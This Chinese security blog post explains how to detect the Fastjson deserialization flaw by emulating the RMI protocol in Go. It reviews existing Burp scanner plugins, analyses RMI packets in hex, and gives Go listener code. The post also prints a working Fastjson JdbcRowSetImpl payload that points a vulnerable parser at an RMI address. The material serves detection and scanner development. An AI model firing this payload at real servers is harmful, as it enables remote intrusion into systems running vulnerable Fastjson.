> 原文链接: https://www.anquanke.com//post/id/249402 


# Golang实现RMI协议自动化检测Fastjson


                                阅读量   
                                **36739**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t0148c9ae7ee5b693c8.jpg)](https://p4.ssl.qhimg.com/t0148c9ae7ee5b693c8.jpg)



## 传统检测方式

笔者继续带大家炒Fastjson的冷饭。关于漏洞分析和利用链分析文章网上已有大量，但是关于如何自动化检测的文章还是比较少见的，尤其是如何不使用Java对Fastjson做检测。是否可以**不用Dnslog平台**，也**不用自行搭建JDNI/LDAP服务**，就可以进行无害化的扫描呢？

其实`tomcat-dbcp`的`BasciDataSource`链可以做到不借助JNDI/LDAP触发反序列化漏洞，但问题还是在于需要自行搭建Dnslog平台。不借助这条链，还有办法吗？

首先我们来看看市面上已有的Fastjson检测工具：

### <a class="reference-link" name="BurpFastJsonScan"></a>BurpFastJsonScan

其中第1-4条Payload过长没有截图，正是rmi和ldap的`JdbcRowSetImpl`链，分成多种是为了绕各个小版本，并且做了编码。所有的Payload都采用了Dnslog的方式，值得一看的是后几条Payload直接用了`java.net`包，感觉这种不太算漏洞利用，只是简单的反序列化做验证

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012441876312a0b691.png)

而以上所有的Payload都需要Dnslog平台，并且需要自行搭建JNDI/LDAP服务，才可以进行盲打

```
public DnsLogCn(IBurpExtenderCallbacks callbacks) `{`
    this.callbacks = callbacks;
    this.dnslogDomainName = "http://www.dnslog.cn";
    this.setExtensionName("DnsLogCn");
    this.init();
`}`
```

sleep后二次验证，是很好的做法，总体来说该检测工具是不错的Burpsuite插件

```
// 防止因为dnslog卡导致没有检测到的问题, 这里进行二次检测, 保证不会漏报
// 睡眠一段时间, 给dnslog一个缓冲时间
try `{`
    Thread.sleep(8000);
`}` catch (InterruptedException e) `{`
    throw new RuntimeException(e);
`}`
// 开始进行二次验证
String dnsLogBodyContent = this.dnsLog.run().getBodyContent();
if (dnsLogBodyContent == null || dnsLogBodyContent.length() &lt;= 0) `{`
    return;
`}`
```

### <a class="reference-link" name="Fastjson-Scanner"></a>Fastjson-Scanner

一个Python写的Burp插件，Payload只有一种，也是借助dnslog，使用的是Burp的`burpsuite collaborato`功能自带Dnslog，是挖洞利器

[![](https://p1.ssl.qhimg.com/t01f94ad2b5468a084b.png)](https://p1.ssl.qhimg.com/t01f94ad2b5468a084b.png)

### <a class="reference-link" name="Fastjson-Scan"></a>Fastjson-Scan

另一个Java版的Burp插件，使用`JdbcRowSetImpl`链和Burp自带的Dnslog

[![](https://p3.ssl.qhimg.com/t01caa0a19272c6c94b.png)](https://p3.ssl.qhimg.com/t01caa0a19272c6c94b.png)

延迟查看Dnslog，防止查不到

```
// 向目标发送payload
IHttpRequestResponse resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
// 担心目标有延迟，所有延时2秒再查看dnslog平台
Thread.sleep(2000);
// 返回的是一个数组
dnsres = context.fetchCollaboratorInteractionsFor(dnslog);
```

菜单中启动扫描任务需要多线程的方式防止阻塞

```
fireTableRowsInserted(row, row);
// 在事件触发时是不能发送网络请求的，否则可能会造成整个burp阻塞崩溃，所以必须要新起一个线程来进行漏洞检测
Thread thread = new Thread(new Runnable() `{`
    @Override
    public void run() `{`
        checkVul(responses[0], row);
    `}`
`}`);
thread.start();
```

### <a class="reference-link" name="%E4%BC%A0%E7%BB%9F%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93"></a>传统方式总结

其实还有一些扫描工具，不过没必要进行阅读了，他们的原理可以总结为：
- 直接用`java.net`包反序列化配合Dnslog方式，需自行配置平台
- 用`JdbcRowSetImpl`链配合Dnslog方式，需要家住LDAP/JNDI Server
- 如果用了`TemplatesImpl`和`BasicDataSource`，没有回显，还是需要借助Dnslog


## 巧妙的方式

该方式参考了长亭**xray**核心作者**koalr**师傅的文章，将在末尾给出链接。笔者在长亭科技实习期间，就是由koalr师傅指导学习和工作，受益匪浅

回到主题，后文将以`JdbcRowSetImpl`链结合`JNDI`注入的方式演示，`JNDI`注入方式不支持高版本JDK可以采用`LDAP`，原理类似

给出以下的真实情景：
- 情景一
某挖洞小队想写一个扫描器，专门用来做Fastjson的扫描，最终打包一个可执行文件方便白帽子们挖洞，执行`./super-scanner -u https://xxx`，需要用户自行配制好Dnslog平台，甚至需要自行搭建`JNDI Server`和对应的`HTTP Server`。
- 情景二
白帽子们抱怨好麻烦，希望能做一款工具无需自行搭建各种平台和服务，就可以实现Fastjson的扫描。于是开发者将Java环境嵌入到Golang/C++编写的程序中，比如用`java -jar xxx.jar`启动服务，再自行编写类似Dnslog的服务，集成到工具中，只要在服务器启动该扫描器，理论上确实可以做到不配置任何平台只用一个可执行文件做到检测。
- 情景三
开发者发现这种方式存在性能问题，首先需要嵌入Java，不得不在电脑上配置Java环境，而且JNDI/LDAP/Dnslog服务本身也是消耗性能并且占用端口的。做批量扫描需要开大量端口并维护一个大`map:[target-&gt;port]`用于区分每一个目标。另外后续该扫描器需要加入其他插件，将会变得较臃肿

是否可以用Golang模拟RMI协议，用于检测目标是否存在Fastjson漏洞

给出RMI官方文档：[文档1](https://docs.oracle.com/javase/8/docs/platform/rmi/spec/rmi-protocol3.html)，[文档2](https://docs.oracle.com/javase/9/docs/specs/rmi/protocol.html#overview)

### <a class="reference-link" name="%E6%8A%A5%E6%96%87%E5%88%86%E6%9E%90"></a>报文分析
- client-&gt;server
参考协议文档：0x4a 0x52 0x4d 0x49 Version Protocol

其中Vesion表示版本，应该是0x00或0x01，

Protocol表示三种具体协议，比如当前0x4b表示`StreamProtocol`

```
原始报文：4a 52 4d 49 00 02 4b
```
- server-&gt;client
参考文档0x4e表示`ProtocolAck`，是正常情况下的ACK确认

0x0009表示报文长度为9，其实是IP地址长度的表示

`31 32 37 2e 30 2e 30 2e 31`-&gt;`127.0.0.1`

最后的0xc4和0x12表示50194端口号

```
原始报文：4e 00 09 31 32 37 2e 30 2e 30 2e 31 00 00 c4 12
```
- client-&gt;server
0x000d表示长度13，而这13位正是一个内网的IP：192.168.222.1

这个内网IP涉及到单波的概念，参考链接：[JDK源码](https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/sun/rmi/server/UnicastRef.java)

```
原始报文：00 0d 31 39 32 2e 31 36 38 2e 32 32 32 2e 31 00 00 00 00
```
- client-&gt;server
0x50是一个flag，代表call操作，0xaced是常见的java magic number。后面这一部分是Java的序列化数据，没有分析的必要（不过注意到末尾的Exploit是JNDI Server绑定的Path）

```
原始报文：
0000   50 ac ed 00 05 77 22 00 00 00 00 00 00 00 00 00   P....w".........
0010   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0020   02 44 15 4d c9 d4 e6 3b df 74 00 07 45 78 70 6c   .D.M...;.t..Expl
0030   6f 69 74                                          oit
```
- server-&gt;client
server数据没有发送结束，0x51是一个flag，代表ReturnData真正的返回数据

后续aced开头的都是java序列化数据

```
原始报文：
0000   51 ac ed 00 05 77 0f 01 c6 ee 4f 24 00 00 01 7b   Q....w....O$...`{`
0010   11 5d c6 ff 80 08 73 72 00 2f 63 6f 6d 2e 73 75   .]....sr./com.su
0020   6e 2e 6a 6e 64 69 2e 72 6d 69 2e 72 65 67 69 73   n.jndi.rmi.regis
0030   74 72 79 2e 52 65 66 65 72 65 6e 63 65 57 72 61   try.ReferenceWra
0040   70 70 65 72 5f 53 74 75 62 00 00 00 00 00 00 00   pper_Stub.......
0050   02 02 00 00 70 78 72 00 1a 6a 61 76 61 2e 72 6d   ....pxr..java.rm
0060   69 2e 73 65 72 76 65 72 2e 52 65 6d 6f 74 65 53   i.server.RemoteS
0070   74 75 62 e9 fe dc c9 8b e1 65 1a 02 00 00 70 78   tub......e....px
0080   72 00 1c 6a 61 76 61 2e 72 6d 69 2e 73 65 72 76   r..java.rmi.serv
0090   65 72 2e 52 65 6d 6f 74 65 4f 62 6a 65 63 74 d3   er.RemoteObject.
00a0   61 b4 91 0c 61 33 1e 03 00 00 70 78 70 77 36 00   a...a3....pxpw6.
00b0   0a 55 6e 69 63 61 73 74 52 65 66 00 0d 31 39 32   .UnicastRef..192
00c0   2e 31 36 38 2e 32 32 32 2e 31 00 00 f3 bd 23 92   .168.222.1....#.
00d0   b3 d9 f7 a3 45 9c c6 ee 4f 24 00 00 01 7b 11 5d   ....E...O$...`{`.]
00e0   c6 ff 80 01 01 78                                 .....x
```
- client-&gt;server
数据接收没有问题，给服务端一个Ping（0x52）

```
原始报文：52
```
- server-&gt;client
对于客户端Ping的响应（0x53）

```
原始报文：53
```
- client-&gt;server
查看文档这里是分布式垃圾回收相关（flag:0x54）的内容，笔者测试多次，返回都是相同的数据，也许是一个确定的值？这点还有待分析，不过第一个value是可以确定的

```
0000   54 c6 ee 4f 24 00 00 01 7b 11 5d c6 ff 80 08      T..O$...`{`.]....
```

### <a class="reference-link" name="Golang%E5%AE%9E%E7%8E%B0"></a>Golang实现

本文的重中之重就在这里，我将给出完整的Golang解析案例

简单的TCP监听：

```
func startListen(host string, port int) `{`
    address := fmt.Sprintf("%s:%d", host, port)
    localAddress, _ := net.ResolveTCPAddr("tcp4", address)
    l, err := net.ListenTCP("tcp", localAddress)
    if err != nil `{`
        panic(err)
    `}`
    doListen(l)
`}`

func doListen(l net.Listener) `{`
    conn, err := l.Accept()
    if err != nil `{`
        panic(err)
    `}`
    data := make([]byte, 1024)
    _, err = conn.Read(data)
    if err != nil `{`
        panic(err)
    `}`
    handleFirst(data, &amp;conn)
`}`
```

解析第一个请求

```
func handleFirst(data []byte, conn *net.Conn) `{`
    fmt.Println("client-&gt;server")
    // 检测第一个请求是否合法
    if !firstCheck(data) `{`
        return
    `}`
    // 发送IP信息的响应
    ret := getFirstResp(conn)
    _, err := (*conn).Write(ret)
    fmt.Println("server-&gt;client:address info")
    if err != nil `{`
        panic(err)
    `}`
    data = make([]byte, 1024)
    // 读取第二个请求
    _, _ = (*conn).Read(data)
    fmt.Println("client-&gt;server:unicast info")
    // 解析第二个请求
    handleSecond(data, conn)
`}`
```

firstCheck内容，根据协议判断每一位是否合法

```
func firstCheck(data []byte) bool `{`
    // check head
    if data[0] == 0x4a &amp;&amp;
        data[1] == 0x52 &amp;&amp;
        data[2] == 0x4d &amp;&amp;
        data[3] == 0x49 `{`
        // check version
        if data[4] != 0x00 &amp;&amp;
            data[4] != 0x01 `{`
            return false
        `}`
        // check protocol
        if data[6] != 0x4b &amp;&amp;
            data[6] != 0x4c &amp;&amp;
            data[6] != 0x4d `{`
            return false
        `}`
        // check other data
        lastData := data[7:]
        for _, v := range lastData `{`
            if v != 0x00 `{`
                return false
            `}`
        `}`
        return true
    `}`
    return false
`}`
```

getFirstResp，构造第一个响应包

```
func getFirstResp(conn *net.Conn) []byte `{`
    var ret []byte
    address := (*conn).RemoteAddr().String()
    ip := strings.Split(address, ":")[0]
    port := strings.Split(address, ":")[1]
    length := len(ip)
    // flag位
    ret = append(ret, 0x4e)
    // length位
    ret = append(ret, 0x00)
    ret = append(ret, uint8(length))
    // 写入ip
    for _, v := range ip `{`
        ret = append(ret, uint8(v))
    `}`
    // 空余
    ret = append(ret, 0x00)
    ret = append(ret, 0x00)
    intPort, _ := strconv.Atoi(port)
    temp := uint16(intPort)
    var b [2]byte
    // 写入端口
    b[1] = uint8(temp)
    b[0] = uint8(temp &gt;&gt; 8)
    ret = append(ret, b[0])
    ret = append(ret, b[1])
    return ret
`}`
```

第二个包处理，由于单播地址不确定，所以给出ipv4的正则

```
func handleSecond(data []byte, conn *net.Conn) `{`
    if data[0] != 0x00 `{`
        return
    `}`
    length := data[1]
    var ip string
    for i := 2; i &lt; int(length)+2; i++ `{`
        ip += fmt.Sprintf("%c", data[i])
    `}`
    // 判断给出的内网IP是否合法
    ipReg := `^((0|[1-9]\d?|1\d\d|2[0-4]\d|25[0-5])\.)`{`3`}`(0|[1-9]\d?|1\d\d|2[0-4]\d|25[0-5])$`
    match, _ := regexp.MatchString(ipReg, ip)
    if match `{`
        lastData := data[int(length)+2:]
        for _, v := range lastData `{`
            if v != 0x00 `{`
                return
            `}`
        `}`
        doThird(conn)
    `}`
`}`
```

返回payload，实际上可以简化

```
func doThird(conn *net.Conn) `{`
    fmt.Println("client-&gt;server:exploit")
    data := make([]byte, 1024)
    _, _ = (*conn).Read(data)
    payload := []byte`{`
        0x51, 0xac, 0xed, 0x00, 0x05, 0x77, 0x0f, 0x01, 0xc6, 0xee, 0x4f, 0x24, 0x00, 0x00, 0x01, 0x7b, 0x11, 0x5d, 0xc6,
        0xff, 0x80, 0x08, 0x73, 0x72, 0x00, 0x2f, 0x63, 0x6f, 0x6d, 0x2e, 0x73, 0x75, 0x6e, 0x2e, 0x6a, 0x6e, 0x64, 0x69,
        0x2e, 0x72, 0x6d, 0x69, 0x2e, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x72, 0x79, 0x2e, 0x52, 0x65, 0x66, 0x65, 0x72,
        0x65, 0x6e, 0x63, 0x65, 0x57, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x5f, 0x53, 0x74, 0x75, 0x62, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x02, 0x02, 0x00, 0x00, 0x70, 0x78, 0x72, 0x00, 0x1a, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x72,
        0x6d, 0x69, 0x2e, 0x73, 0x65, 0x72, 0x76, 0x65, 0x72, 0x2e, 0x52, 0x65, 0x6d, 0x6f, 0x74, 0x65, 0x53, 0x74, 0x75,
        0x62, 0xe9, 0xfe, 0xdc, 0xc9, 0x8b, 0xe1, 0x65, 0x1a, 0x02, 0x00, 0x00, 0x70, 0x78, 0x72, 0x00, 0x1c, 0x6a, 0x61,
        0x76, 0x61, 0x2e, 0x72, 0x6d, 0x69, 0x2e, 0x73, 0x65, 0x72, 0x76, 0x65, 0x72, 0x2e, 0x52, 0x65, 0x6d, 0x6f, 0x74,
        0x65, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0xd3, 0x61, 0xb4, 0x91, 0x0c, 0x61, 0x33, 0x1e, 0x03, 0x00, 0x00, 0x70,
        0x78, 0x70, 0x77, 0x36, 0x00, 0x0a, 0x55, 0x6e, 0x69, 0x63, 0x61, 0x73, 0x74, 0x52, 0x65, 0x66, 0x00, 0x0d, 0x31,
        0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x32, 0x32, 0x32, 0x2e, 0x31, 0x00, 0x00, 0xf3, 0xbd, 0x23, 0x92, 0xb3,
        0xd9, 0xf7, 0xa3, 0x45, 0x9c, 0xc6, 0xee, 0x4f, 0x24, 0x00, 0x00, 0x01, 0x7b, 0x11, 0x5d, 0xc6, 0xff, 0x80, 0x01,
        0x01, 0x78,
    `}`
    _, _ = (*conn).Write(payload)
    data = make([]byte, 1024)
    _, _ = (*conn).Read(data)
    if data[0] == 0x52 `{`
        lastData := data[1:]
        for _, v := range lastData `{`
            if v != 0x00 `{`
                return
            `}`
        `}`
        doFinal(conn)
    `}`
`}`
```

最后两步的Ping和Ack，DgcAck无法确认后续内容，只对第一位进行校验

```
func doFinal(conn *net.Conn) `{`
    _, _ = (*conn).Write([]byte`{`0x53`}`)
    data := make([]byte, 1024)
    _, _ = (*conn).Read(data)
    if data[0] == 0x54 `{`
        fmt.Println("final")
    `}`
`}`
```

最终触发Payload

```
public static void main(String[] argv) throws Exception `{`
    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
    String payload = "`{`\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
        "\"dataSourceName\":\"rmi://127.0.0.1:8888/Exploit\", " +
        "\"autoCommit\":true`}`";
    JSON.parse(payload);
`}`
```

效果如图，成功用golang实现RMI协议的解析，代码有很多不完善，但是提供了一种思路，也许各大厂商可以将该思路加入自己的fastjson扫描组件中

[![](https://p3.ssl.qhimg.com/t013cbfca8c76fec387.png)](https://p3.ssl.qhimg.com/t013cbfca8c76fec387.png)



## 参考链接

[https://koalr.me/post/fastjson-deserialization-detection/](https://koalr.me/post/fastjson-deserialization-detection/)

[https://docs.oracle.com/javase/9/docs/specs/rmi/protocol.html#overview](https://docs.oracle.com/javase/9/docs/specs/rmi/protocol.html#overview)
